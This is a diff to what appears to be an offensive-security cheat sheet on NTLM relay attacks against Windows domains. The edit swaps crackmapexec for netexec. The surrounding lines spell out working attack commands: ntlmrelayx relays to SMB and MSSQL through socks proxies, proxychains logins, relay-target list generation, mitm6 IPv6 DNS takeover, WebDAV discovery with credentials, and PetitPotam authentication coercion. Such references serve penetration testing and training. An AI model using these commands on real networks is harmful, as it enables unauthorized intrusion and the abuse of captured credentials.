@@ -83,10 +83,10 @@ If a machine has `SMB signing`:`disabled`, it is possible to use Responder with 
     impacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support
     impacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support
 
-    # the socks proxy can then be used with your Impacket tools or CrackMapExec
+    # the socks proxy can then be used with your Impacket tools or netexec
     $ proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1
     $ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth
-    $ proxychains crackmapexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q "SELECT 1"   
+    $ proxychains netexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q "SELECT 1"   
     ```
 
 **Mitigations**:
@@ -106,7 +106,7 @@ If a machine has `SMB signing`:`disabled`, it is possible to use Responder with 
 Since [MS16-077](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-077) the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.
 
 ```powershell
-crackmapexec smb $hosts --gen-relay-list relay.txt
+netexec smb $hosts --gen-relay-list relay.txt
 
 # DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6
 # -d is the domain name that we filter our request on - the attacked domain
@@ -239,7 +239,7 @@ secretsdump.py -k -no-pass target.lab.local
 * Discover WebDAV services
     ```ps1
     webclientservicescanner 'domain.local'/'user':'password'@'machine'
-    crackmapexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav
+    netexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav
     GetWebDAVStatus.exe 'machine'
     ```
 * Trigger the authentication to relay to our nltmrelayx: `PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4`, the listener host must be specified with the FQDN or full netbios name like `logger.domain.local@80/test.txt`. Specifying the IP results in anonymous auth instead of System. 
